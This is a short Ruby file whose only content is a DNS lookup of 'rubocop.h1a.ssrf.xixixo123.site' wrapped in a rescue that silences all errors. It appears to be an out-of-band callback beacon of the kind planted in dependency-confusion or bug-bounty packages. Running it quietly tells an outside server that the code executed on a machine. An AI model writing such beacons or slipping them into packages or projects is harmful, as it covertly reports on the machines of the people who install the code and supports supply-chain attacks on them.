require 'resolv'
begin
  Resolv::DNS.new.getaddress("rubocop.h1a.ssrf.xixixo123.site")
rescue StandardError
end
